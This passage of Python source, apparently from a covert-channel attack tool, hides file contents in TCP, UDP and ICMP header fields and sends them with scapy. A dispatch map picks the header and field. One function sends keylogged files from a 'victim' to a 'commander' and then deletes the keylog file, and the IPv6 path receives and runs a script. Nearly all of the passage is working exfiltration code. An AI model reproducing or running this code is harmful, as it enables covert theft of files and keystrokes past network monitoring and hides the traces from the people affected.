    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_ack_num(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
                              file_path: str):
    """
    Hides file data covertly in TCP headers using the
    acknowledgement number field.

    @note Bit length
        The acknowledgement number field for TCP headers is 32 bits (4 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        ack_num = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, ack=ack_num)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_data_offset(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
                                  src_port: int,
                                  file_path: str):
    """
    Hides file data covertly in TCP headers using the
    data-offset field.

    This is also known as the header
    length that indicates the length of the TCP header
    and specifies where the data portion starts.

    @note Bit length
        The data offset field for TCP headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        data_offset = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, dataofs=data_offset)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_reserved(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in TCP headers using the
    reserved field.

    @note Bit length
        The reserved field for TCP headers is 3 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 3):
        binary_segment = binary_data[i:i + 3].ljust(3, '0')
        reserved_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, reserved=reserved_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_flags(client_sock: socket.socket,
                            dest_ip: str,
                            dest_port: int,
                            src_port: int,
                            file_path: str):
    """
    Hides file data covertly in TCP headers using the
    various control flag fields.

    @attention The recipient may not be able to recover the original data due to
               various flags being set

    @note Bit length
        The control flags field for TCP headers is 9 bits for the different
        flags (ECN, ACK, SYN, FIN, etc.)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 9):  # 3 bit chunks
        binary_segment = binary_data[i:i + 9].ljust(9, '0')
        flag_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, flags=flag_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_window_size(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
                                  src_port: int,
                                  file_path: str):
    """
    Hides file data covertly in TCP headers using the
    window size field.

    @note Bit length
        The window size field for TCP headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        window_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, window=window_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_chksum(client_sock: socket.socket,
                             dest_ip: str,
                             dest_port: int,
                             src_port: int,
                             file_path: str):
    """
    Hides file data covertly in TCP headers using the
    checksum field.

    @note Bit length
        The checksum field for TCP headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        chksum_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, chksum=chksum_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_urgent_ptr(client_sock: socket.socket,
                                 dest_ip: str,
                                 dest_port: int,
                                 src_port: int,
                                 file_path: str):
    """
    Hides file data covertly in TCP headers using the
    urgent pointer field.

    @note Bit length
        The urgent pointer field for TCP headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        urg_ptr_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, urgptr=urg_ptr_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_options(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
                              file_path: str):
    """
    Hides file data covertly in TCP headers using the
    TimeStamp options field.

    @note Bit length
        - The options field for TCP headers is maximum 320 bits (40 bytes)
        - 16 bits chosen here for TimeStamp option (can be reduced for more covertness)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        timestamp_val = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port,
                                       dport=dest_port,
                                       options=[(constants.TIMESTAMP, (timestamp_val, 0))])  # (ts_val, ts_echo)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


# ===================== UDP HEADER COVERT DATA FUNCTIONS =====================


def transfer_file_udp_src_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in UDP headers using the
    source port field.

    @note Bit length
        The source port field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_src_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=new_src_port, dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_udp_dst_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in UDP headers using the
    destination port field.

    @note Bit length
        The destination port field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_dst_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=new_dst_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_udp_length(client_sock: socket.socket,
                             dest_ip: str,
                             dest_port: int,
                             src_port: int,
                             file_path: str):
    """
    Hides file data covertly in UDP headers using the
    length field.

    @note Bit length
        The length field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        length = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=dest_port, len=length)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_udp_chksum(client_sock: socket.socket,
                             dest_ip: str,
                             dest_port: int,
                             src_port: int,
                             file_path: str):
    """
    Hides file data covertly in UDP headers using the
    checksum field.

    @note Bit length
        The checksum field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        chksum_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=dest_port, chksum=chksum_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


# ===================== ICMP HEADER COVERT DATA FUNCTIONS =====================


def transfer_file_icmp_type(client_sock: socket.socket,
                            dest_ip: str,
                            file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    type field.

    @note Bit length
        The type field for ICMP headers is maximum 8 bits (1 byte)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):  # 8 bit chunks
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        type_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(type=type_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_code(client_sock: socket.socket,
                            dest_ip: str,
                            file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    code field.

    @note Bit length
        The code field for ICMP headers is maximum 8 bits (1 byte)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):  # 8 bit chunks
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        code_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(code=code_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_chksum(client_sock: socket.socket,
                              dest_ip: str,
                              file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    checksum field.

    @note Bit length
        The checksum field for ICMP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        chksum_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(chksum=chksum_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_identification(client_sock: socket.socket,
                                      dest_ip: str,
                                      file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    identification field.

    @note Bit length
        The identification field for ICMP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        id_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(id=id_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_seq_num(client_sock: socket.socket,
                               dest_ip: str,
                               file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    sequence number field.

    @note Bit length
        The sequence number field for ICMP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        seq_num_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(seq=seq_num_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def __get_protocol_header_transfer_function_map():
    return {  # A tuple of [Header, Field] => Function
        # a) IPv4 Handlers
        ("IPv4", "Version"): transfer_file_ipv4_version,
        ("IPv4", "IHL (Internet Header Length)"): transfer_file_ipv4_ihl,
        ("IPv4", "DS (Differentiated Services Codepoint)"): transfer_file_ipv4_ds,
        ("IPv4", "Explicit Congestion Notification (ECN)"): transfer_file_ipv4_ecn,
        ("IPv4", "Total Length"): transfer_file_ipv4_total_length,
        ("IPv4", "Identification"): transfer_file_ipv4_identification,
        ("IPv4", "Flags"): transfer_file_ipv4_flags,
        ("IPv4", "Fragment Offset"): transfer_file_ipv4_frag_offset,
        ("IPv4", "TTL (Time to Live)"): transfer_file_ipv4_ttl,
        ("IPv4", "Protocol"): transfer_file_ipv4_protocol,
        ("IPv4", "Header Checksum"): transfer_file_ipv4_header_chksum,
        ("IPv4", "Source Address"): transfer_file_ipv4_src_addr,
        ("IPv4", "Destination Address"): transfer_file_ipv4_dst_addr,

        # b) IPv6 Handlers
        ("IPv6", "Version"): transfer_file_ipv6_version,
        ("IPv6", "Traffic Class"): transfer_file_ipv6_traffic_class,
        ("IPv6", "Flow Label"): transfer_file_ipv6_flow_label,
        ("IPv6", "Payload Length"): transfer_file_ipv6_payload_length,
        ("IPv6", "Next Header"): transfer_file_ipv6_next_header,
        ("IPv6", "Hop Limit"): transfer_file_ipv6_hop_limit,
        ("IPv6", "Source Address"): transfer_file_ipv6_src_addr,
        ("IPv6", "Destination Address"): transfer_file_ipv6_dest_addr,

        # c) TCP Handlers
        ("TCP", "Source Port"): transfer_file_tcp_src_port,
        ("TCP", "Destination Port"): transfer_file_tcp_dst_port,
        ("TCP", "Sequence Number"): transfer_file_tcp_seq_num,
        ("TCP", "Acknowledgement Number"): transfer_file_tcp_ack_num,
        ("TCP", "Data Offset"): transfer_file_tcp_data_offset,
        ("TCP", "Reserved"): transfer_file_tcp_reserved,
        ("TCP", "Flags"): transfer_file_tcp_flags,
        ("TCP", "Window Size"): transfer_file_tcp_window_size,
        ("TCP", "Checksum"): transfer_file_tcp_chksum,
        ("TCP", "Urgent Pointer"): transfer_file_tcp_urgent_ptr,
        ("TCP", "Options"): transfer_file_tcp_options,

        # d) UDP Handlers
        ("UDP", "Source Port"): transfer_file_udp_src_port,
        ("UDP", "Destination Port"): transfer_file_udp_dst_port,
        ("UDP", "Length"): transfer_file_udp_length,
        ("UDP", "Checksum"): transfer_file_udp_chksum,

        # e) ICMP Handlers
        ("ICMP", "Type (Type of Message)"): transfer_file_icmp_type,
        ("ICMP", "Code"): transfer_file_icmp_code,
        ("ICMP", "Checksum"): transfer_file_icmp_chksum,
        ("ICMP", "Identifier"): transfer_file_icmp_identification,
        ("ICMP", "Sequence Number"): transfer_file_icmp_seq_num,
    }


def transfer_file_covert(sock: socket.socket, dest_ip: str,
                         dest_port: int, source_port: int,
                         choices: tuple, file_path: str):
    # Initialize map
    header_field_function_map = __get_protocol_header_transfer_function_map()

    # Find the choice(header/field) in map, get and call the mapped function
    if choices in header_field_function_map:
        selected_function = header_field_function_map.get(choices)

        # DIFFERENT HANDLERS: IPv4
        if constants.IPV4 in choices:
            if constants.SOURCE_ADDRESS_FIELD in choices:
                selected_function(sock, dest_ip, dest_port, source_port, file_path)

            elif selected_function is not None and callable(selected_function):
                selected_function(sock, dest_ip, file_path)

        # DIFFERENT HANDLERS: IPv6
        elif constants.IPV6 in choices:
            if constants.DESTINATION_ADDRESS_FIELD in choices:
                __transfer_file_dst_addr_error_handler(choices[1], choices[0])
                return None

            # Receive file, execute script and send IPv6 to commander for sniff (DON'T RETURN ANYTHING)
            receive_get_ipv6_script(sock, dest_ip, dest_port)

            # Get IPv6 address and port from commander
            cmdr_ipv6_addr, cmdr_ipv6_port = sock.recv(1024).decode().split("/")
            selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path)

        # DIFFERENT HANDLERS: TCP or UDP
        elif constants.TCP in choices or constants.UDP in choices:
            selected_function(sock, dest_ip, dest_port, source_port, file_path)

        # DIFFERENT HANDLERS: ICMP
        elif constants.ICMP in choices:
            selected_function(sock, dest_ip, file_path)

        else:
            print(constants.CALL_MAP_FUNCTION_ERROR)
            return None
    else:
        print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
        return None

    # Get an ACK from the victim for success
    transfer_result = sock.recv(1024).decode()

    if transfer_result == constants.VICTIM_ACK:
        print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
                                                        dest_ip,
                                                        dest_port))
        print(constants.AWAIT_NEXT_OP_MSG)
        print(constants.MENU_CLOSING_BANNER)
    else:
        print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
        print(constants.AWAIT_NEXT_OP_MSG)
        print(constants.MENU_CLOSING_BANNER)


def transfer_file_covert_helper_print_config(file_path: str, header: str, field: str):
    print(constants.GET_FILE_CMDR_PATH.format(file_path))
    print(constants.GET_FILE_FOUND_MSG.format(file_path))
    print(constants.GET_FILE_INIT_MSG.format(file_path))
    print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(header, field))
    print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(header, field))


def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
                                dest_port: int, source_port: int,
                                choices: tuple, file_path: str):
    """
    A different version from the regular transfer_file_covert(),
    but specifically deals with the transfer of saved keylogged
    files from victim to commander.

    @param sock:
        The commander socket

    @param dest_ip:
        The commander's IP address

    @param dest_port:
        The commander's port number

    @param source_port:
        The victim's port number

    @param choices:
        A tuple containing the covert channel configuration
        (header/field)

    @param file_path:
        A string representing the file path of keylog .txt file in the current directory

    @return: None
    """
    # CHECK: If destination field choice, do nothing
    if constants.DESTINATION_ADDRESS_FIELD in choices:
        __transfer_file_dst_addr_error_handler(choices[1], choices[0])
        return None

    # Initialize map
    header_field_function_map = __get_protocol_header_transfer_function_map()

    # Find the choice(header/field) in map, get and call the mapped function
    if choices in header_field_function_map:
        selected_function = header_field_function_map.get(choices)

        # DIFFERENT HANDLERS: IPv4
        if constants.IPV4 in choices:
            if constants.SOURCE_ADDRESS_FIELD in choices:
                selected_function(sock, dest_ip, dest_port, source_port, file_path)

            elif selected_function is not None and callable(selected_function):
                selected_function(sock, dest_ip, file_path)

        # DIFFERENT HANDLERS: IPv6
        elif constants.IPV6 in choices:
            # Receive file, execute script and send IPv6 to commander for sniff (DON'T RETURN ANYTHING)
            receive_get_ipv6_script(sock, dest_ip, dest_port)

            # Get IPv6 address and port from commander
            cmdr_ipv6_addr, cmdr_ipv6_port = sock.recv(1024).decode().split("/")
            selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path)

        # DIFFERENT HANDLERS: TCP or UDP
        elif constants.TCP in choices or constants.UDP in choices:
            selected_function(sock, dest_ip, dest_port, source_port, file_path)

        # DIFFERENT HANDLERS: ICMP
        elif constants.ICMP in choices:
            selected_function(sock, dest_ip, file_path)

        else:
            print(constants.CALL_MAP_FUNCTION_ERROR)
            return None
    else:
        print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
        return None

    # Get an ACK from the victim for success
    transfer_result = sock.recv(1024).decode()

    if transfer_result == constants.VICTIM_ACK:
        print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
                                                        dest_ip,
                                                        dest_port))
        # Delete .txt file
        delete_file(file_path)
        print(constants.AWAIT_NEXT_OP_MSG)
        print(constants.MENU_CLOSING_BANNER)
    else:
        print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
        print(constants.AWAIT_NEXT_OP_MSG)
        print(constants.MENU_CLOSING_BANNER)
